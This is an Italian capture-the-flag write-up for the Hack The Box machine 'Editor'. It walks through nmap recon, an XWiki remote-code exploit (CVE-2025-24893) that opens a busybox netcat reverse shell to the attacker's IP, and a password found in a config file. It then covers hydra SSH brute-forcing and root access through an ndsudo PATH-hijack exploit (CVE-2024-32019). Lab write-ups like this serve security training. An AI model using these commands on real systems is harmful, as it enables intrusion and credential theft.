# Macchina Editor

IP vittima: 10.129.94.246 
IP attacante: 10.10.14.245

## Recon

`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.94.246 -oG porte`

![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251009220545.png)

Porte: 22, 80, 8080
`nmap -sC -sV -p22,80,8080 10.129.94.246 -oN servizi`

## Porta 8080

![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251009221030.png)

## exploit CVE-2025-24893

Esiste un exploit per xwiki 15.10.10: CVE-2025-24893 (dal sito exploit-db)
Trovato uno script pyton per sfruttarlo
https://github.com/gunzf0x/CVE-2025-24893
Scaricato lo script, concessi i permessi di esecuzione(`chmod +x`)
mettersi in ascolto con netcat: `nc -nlvp 4500`
Lanciare lo script con il comando
`python3 CVE-2025-24893.py -t 'http://10.129.94.246:8080' -c 'busybox nc 10.10.14.245 4500 -e /bin/bash'`

Riusciamo entrare come utente xwiki

## username utente

con `cat /etc/passwd` vediamo l'elenco degli utenti tra cui compare l'utente oliver
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251011101549.png)

## password utente

Nella cartella /usr/lib/xwiki/WEB-INF c'è il file hibernate.cfg.xml nel quale troviamo la password 'theEd1t0rTeam99'
E' possibile velocizzare la ricerca della password con un comando grep che cerca la parola password in tutti i file leggibili: 
`grep -R -n --color=always "password" . 2>/dev/null`

## Porta 22

Possiamo provare ad entrare in ssh con utente oliver e password theEd1t0rTeam99

#### Nel caso non avessimo trovato il nome utente ma solo la password (o viceversa) si può provare un attacco brute force

tentiamo un brute force di ssh usando la password trovata e una lista di nomi utente con il comando
`hydra -t 4 -L /usr/share/seclists/Usernames/Names/malenames-usa-top1000-lower.txt -p "theEd1t0rTeam99" ssh://10.129.94.246`
Troviamo l'utente oliver
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251009222355.png)

entriamo in ssh con l'utente oliver e la password theEd1t0rTeam99
nella cartella /home/oliver troviamo il file user.txt che contiene la userflag

## scalata dei privilegi

con il comando 
`find / -perm -4000 -type f 2>/dev/null`
si cerca **all’interno di tutto il file system** (`/`) i file regolari (`-type f`) con il bit **SUID** impostato (`-perm -4000`)
si trova
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251009234444.png)
Si cerca un exploit per ndsudo
ndsudo è vulnerabile all'exploit CVE-2024-32019
qui troviamo uno script per l'exploit: https://github.com/AzureADTrent/CVE-2024-32019-POC
Scarichiamo sulla nostra macchina lo script in C per l'exploit poc.c
lo compiliamo con il comando gcc poc.c -o nvme
mandiamo il file compilato nvme nella cartella tmp della macchina vittima con il comando:
`scp nvme oliver@10.129.94.246:/tmp/ `
inserendo la password di oliver (theEd1t0rTeam99)
diamo al file nvme i permessi di esecuzione con chmod +x /tmp/nvme
aggiungiamo al PATH la cartella tmp con export PATH=/tmp:$PATH
lanciamo ndsudo con lo script nvme con `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`
Siamo diventati root
Nella cartella /root è presente il file root.txt che contiene la rootflagtroviamo la rootflag nel file `root.txt` 
